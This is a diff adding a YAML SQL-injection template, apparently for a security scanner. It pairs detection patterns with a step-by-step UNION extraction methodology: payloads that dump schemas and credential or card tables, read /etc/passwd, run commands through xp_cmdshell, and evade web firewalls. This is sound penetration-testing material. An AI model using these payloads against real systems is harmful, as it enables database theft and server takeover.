@@ -1,0 +1,144 @@
+id: sqli-error-based
+category: detection
+title: SQL Injection - Error Based Detection
+info:
+  name: SQL Injection - Error Based Detection
+  severity: high
+  cwe: CWE-89
+  owasp: "A03:2021"
+  description: >
+    SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query.
+    Error-based SQLi reveals database errors in HTTP responses, confirming the injection vector.
+
+patterns:
+  - type: response_match
+    description: Database error strings leaked in HTTP response body
+    strings:
+      - "SQL syntax"
+      - "mysql_fetch"
+      - "mysql_num_rows"
+      - "ORA-01756"
+      - "ORA-00933"
+      - "PostgreSQL query failed"
+      - "pg_query"
+      - "Microsoft OLE DB Provider"
+      - "Unclosed quotation mark"
+      - "SQLITE_ERROR"
+      - "sqlite3.OperationalError"
+      - "SQLSTATE["
+      - "syntax error at or near"
+      - "com.mysql.jdbc"
+      - "java.sql.SQLException"
+    case_insensitive: true
+
+  - type: response_diff
+    description: Response differs significantly when appending SQL metacharacters
+    test_payloads:
+      - "'"
+      - "' OR '1'='1"
+      - "1 OR 1=1"
+      - "' UNION SELECT NULL--"
+    threshold: 0.3
+
+  - type: time_based
+    description: Response time increases with injected SLEEP/WAITFOR
+    test_payloads:
+      - "' OR SLEEP(5)--"
+      - "'; WAITFOR DELAY '0:0:5'--"
+      - "' OR pg_sleep(5)--"
+    delay_threshold_seconds: 4.5
+
+  - type: boolean_based
+    description: Response differs between true and false conditions
+    true_payload: "' OR '1'='1"
+    false_payload: "' OR '1'='2"
+    comparison: content_length_diff
+
+test_locations:
+  - url_parameters
+  - post_body_parameters
+  - http_headers_cookie
+  - http_headers_referer
+  - json_body_values
+
+tags:
+  - injection
+  - database
+  - owasp-top10
+
+union_extraction_methodology:
+  description: "Step-by-step UNION-based data extraction after confirming SQL injection"
+  prerequisites:
+    - "SQL injection confirmed via error-based, boolean-based, or UNION detection"
+    - "Target DBMS identified (MySQL, PostgreSQL, SQLite, MSSQL, Oracle)"
+  steps:
+    - step: 1
+      name: "Column count discovery"
+      technique: "Increment ORDER BY clause until error"
+      payloads:
+        - "' ORDER BY 1--"
+        - "' ORDER BY 2--"
+        - "' ORDER BY N--  (increment until error → N-1 columns)"
+      note: "If ORDER BY is blocked, use UNION SELECT NULL,NULL,... adding NULLs until no error"
+
+    - step: 2
+      name: "String column identification"
+      technique: "Replace each NULL with a marker string to find which columns render"
+      payloads:
+        - "' UNION SELECT 'secmcp_marker',NULL,NULL,...--"
+        - "' UNION SELECT NULL,'secmcp_marker',NULL,...--"
+      note: "The column position where 'secmcp_marker' appears in the response is your output channel"
+
+    - step: 3
+      name: "DBMS version fingerprint"
+      techniques:
+        mysql: "' UNION SELECT version(),NULL,...--"
+        postgresql: "' UNION SELECT version(),NULL,...--"
+        sqlite: "' UNION SELECT sqlite_version(),NULL,...--"
+        mssql: "' UNION SELECT @@version,NULL,...--"
+        oracle: "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--"
+
+    - step: 4
+      name: "Schema extraction"
+      techniques:
+        mysql: "' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--"
+        postgresql: "' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema='public'--"
+        sqlite: "' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
+        mssql: "' UNION SELECT name,CAST(id AS VARCHAR) FROM sysobjects WHERE xtype='U'--"
+        oracle: "' UNION SELECT table_name,column_name FROM all_tab_columns WHERE owner=USER--"
+      note: "Pad with NULL columns to match the column count from step 1"
+
+    - step: 5
+      name: "Data extraction"
+      technique: "Query discovered tables using column names from step 4"
+      example: "' UNION SELECT col1,col2,col3,NULL,... FROM target_table--"
+      high_value_targets:
+        - "User/account tables (emails, password hashes, roles)"
+        - "Session/token tables"
+        - "Payment/card tables (PCI-DSS critical)"
+        - "Configuration tables (API keys, secrets)"
+        - "Audit/log tables"
+
+    - step: 6
+      name: "Advanced extraction"
+      techniques:
+        concatenation:
+          mysql: "GROUP_CONCAT(column SEPARATOR ',')"
+          postgresql: "STRING_AGG(column, ',')"
+          sqlite: "GROUP_CONCAT(column, ',')"
+          mssql: "STRING_AGG(column, ',')"
+        file_read:
+          mysql: "LOAD_FILE('/etc/passwd')"
+          postgresql: "pg_read_file('/etc/passwd')"
+        command_execution:
+          mssql: "xp_cmdshell('whoami')  -- requires sysadmin"
+          postgresql: "COPY (SELECT '') TO PROGRAM 'id'  -- requires superuser"
+      note: "File read and command execution are Critical severity escalations"
+
+  waf_bypass_tips:
+    - "Use /**/ between SQL keywords: UN/**/ION SEL/**/ECT"
+    - "Case alternation: uNiOn SeLeCt"
+    - "Double URL-encode: %2527 instead of %27"
+    - "Use CHAR() for string literals: CHAR(115,101,99,109,99,112)"
+    - "Inline comments: /*!50000UNION*/ SELECT"
+    - "Tab/newline instead of space: UNION%09SELECT, UNION%0aSELECT"
